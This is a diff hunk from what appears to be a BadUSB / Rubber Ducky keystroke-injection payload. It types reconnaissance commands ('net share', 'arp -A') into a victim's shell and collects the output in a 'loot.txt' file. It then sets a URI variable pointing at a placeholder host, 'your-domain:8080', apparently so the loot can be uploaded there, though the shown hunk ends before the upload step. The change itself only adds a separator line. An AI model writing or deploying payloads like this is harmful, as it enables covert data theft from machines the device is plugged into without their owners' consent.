@@ -59,6 +59,8 @@ STRINGLN net share >> loot.txt
 DELAY 2000
 STRINGLN arp -A >> loot.txt
 DELAY 1000
+STRINGLN echo "--------------------------------------------------" >> loot.txt
+DELAY 200
 STRINGLN $file = "~/loot.txt"
 DELAY 500
 STRINGLN $uri = "http://your-domain:8080/"
